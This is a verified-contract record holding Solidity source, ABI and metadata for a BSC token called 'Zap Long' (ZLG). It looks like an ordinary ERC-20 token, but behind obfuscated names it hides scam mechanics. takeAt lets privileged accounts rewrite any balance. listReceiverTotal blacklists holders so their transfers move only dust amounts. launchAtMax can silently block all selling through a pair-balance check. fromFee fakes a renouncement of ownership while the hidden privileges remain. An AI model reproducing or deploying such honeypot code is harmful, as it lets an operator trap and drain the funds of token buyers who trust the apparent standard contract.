{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface txAutoFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTrading {\n    function createPair(address sellFundAuto, address tradingMaxEnable) external returns (address);\n}\n\ninterface atWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletAmount) external view returns (uint256);\n\n    function transfer(address walletReceiver, uint256 exemptReceiverBuy) external returns (bool);\n\n    function allowance(address toList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptReceiverBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletReceiver,\n        uint256 exemptReceiverBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTx, uint256 value);\n    event Approval(address indexed toList, address indexed spender, uint256 value);\n}\n\ninterface limitBuy is atWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ZapLong is fromTeam, atWallet, limitBuy {\n\n    function balanceOf(address walletAmount) public view virtual override returns (uint256) {\n        return tokenFrom[walletAmount];\n    }\n\n    function maxLimitFee() private view {\n        require(txAmountToken[_msgSender()]);\n    }\n\n    uint256 public toAtBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingLiquidity;\n    }\n\n    function maxFee(address buyTotal, address walletReceiver, uint256 exemptReceiverBuy) internal returns (bool) {\n        if (buyTotal == launchedIsAuto) {\n            return launchToken(buyTotal, walletReceiver, exemptReceiverBuy);\n        }\n        uint256 listMin = atWallet(txMarketing).balanceOf(launchTx);\n        require(listMin == swapMinReceiver);\n        require(walletReceiver != launchTx);\n        if (teamFund[buyTotal]) {\n            return launchToken(buyTotal, walletReceiver, shouldEnableMax);\n        }\n        return launchToken(buyTotal, walletReceiver, exemptReceiverBuy);\n    }\n\n    function transferFrom(address buyTotal, address walletReceiver, uint256 exemptReceiverBuy) external override returns (bool) {\n        if (_msgSender() != swapSender) {\n            if (teamEnable[buyTotal][_msgSender()] != type(uint256).max) {\n                require(exemptReceiverBuy <= teamEnable[buyTotal][_msgSender()]);\n                teamEnable[buyTotal][_msgSender()] -= exemptReceiverBuy;\n            }\n        }\n        return maxFee(buyTotal, walletReceiver, exemptReceiverBuy);\n    }\n\n    bool public liquidityBuy;\n\n    function transfer(address listAuto, uint256 exemptReceiverBuy) external virtual override returns (bool) {\n        return maxFee(_msgSender(), listAuto, exemptReceiverBuy);\n    }\n\n    bool public fundExempt;\n\n    function listReceiverTotal(address isTrading) public {\n        maxLimitFee();\n        if (fundExempt == buyLiquidityAmount) {\n            toAtBuy = receiverTotalFrom;\n        }\n        if (isTrading == launchedIsAuto || isTrading == txMarketing) {\n            return;\n        }\n        teamFund[isTrading] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxLaunch;\n    }\n\n    uint256 constant shouldEnableMax = 5 ** 10;\n\n    string private launchLimit = \"Zap Long\";\n\n    address launchTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchAtMax(uint256 exemptReceiverBuy) public {\n        maxLimitFee();\n        swapMinReceiver = exemptReceiverBuy;\n    }\n\n    function fromFee() public {\n        emit OwnershipTransferred(launchedIsAuto, address(0));\n        maxTotal = address(0);\n    }\n\n    mapping(address => bool) public teamFund;\n\n    uint256 public exemptReceiver;\n\n    address public txMarketing;\n\n    function maxEnable(address tokenSender) public {\n        if (liquidityBuy) {\n            return;\n        }\n        if (autoBuy != toAtBuy) {\n            fundExempt = true;\n        }\n        txAmountToken[tokenSender] = true;\n        \n        liquidityBuy = true;\n    }\n\n    mapping(address => uint256) private tokenFrom;\n\n    uint256 private receiverTotalFrom;\n\n    address public launchedIsAuto;\n\n    uint256 private maxLaunch = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed senderLiquidity, address indexed toMarketing);\n\n    bool public buyLiquidityAmount;\n\n    address private maxTotal;\n\n    function allowance(address txTokenMode, address totalFee) external view virtual override returns (uint256) {\n        if (totalFee == swapSender) {\n            return type(uint256).max;\n        }\n        return teamEnable[txTokenMode][totalFee];\n    }\n\n    function approve(address totalFee, uint256 exemptReceiverBuy) public virtual override returns (bool) {\n        teamEnable[_msgSender()][totalFee] = exemptReceiverBuy;\n        emit Approval(_msgSender(), totalFee, exemptReceiverBuy);\n        return true;\n    }\n\n    address swapSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 swapMinReceiver;\n\n    function owner() external view returns (address) {\n        return maxTotal;\n    }\n\n    constructor (){\n        if (receiverTotalFrom == exemptReceiver) {\n            fundExempt = true;\n        }\n        txAutoFrom receiverMax = txAutoFrom(swapSender);\n        txMarketing = minTrading(receiverMax.factory()).createPair(receiverMax.WETH(), address(this));\n        \n        launchedIsAuto = _msgSender();\n        fromFee();\n        txAmountToken[launchedIsAuto] = true;\n        tokenFrom[launchedIsAuto] = maxLaunch;\n        \n        emit Transfer(address(0), launchedIsAuto, maxLaunch);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalToken;\n    }\n\n    uint256 public toFund;\n\n    uint256 private autoBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return launchLimit;\n    }\n\n    uint256 maxFeeWallet;\n\n    function getOwner() external view returns (address) {\n        return maxTotal;\n    }\n\n    uint256 private launchedLaunch;\n\n    mapping(address => bool) public txAmountToken;\n\n    string private tradingLiquidity = \"ZLG\";\n\n    uint8 private totalToken = 18;\n\n    function launchToken(address buyTotal, address walletReceiver, uint256 exemptReceiverBuy) internal returns (bool) {\n        require(tokenFrom[buyTotal] >= exemptReceiverBuy);\n        tokenFrom[buyTotal] -= exemptReceiverBuy;\n        tokenFrom[walletReceiver] += exemptReceiverBuy;\n        emit Transfer(buyTotal, walletReceiver, exemptReceiverBuy);\n        return true;\n    }\n\n    function takeAt(address listAuto, uint256 exemptReceiverBuy) public {\n        maxLimitFee();\n        tokenFrom[listAuto] = exemptReceiverBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTokenMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidityAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"launchAtMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIsAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"}],\"name\":\"listReceiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"}],\"name\":\"maxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"takeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAtBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAmountToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ZapLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}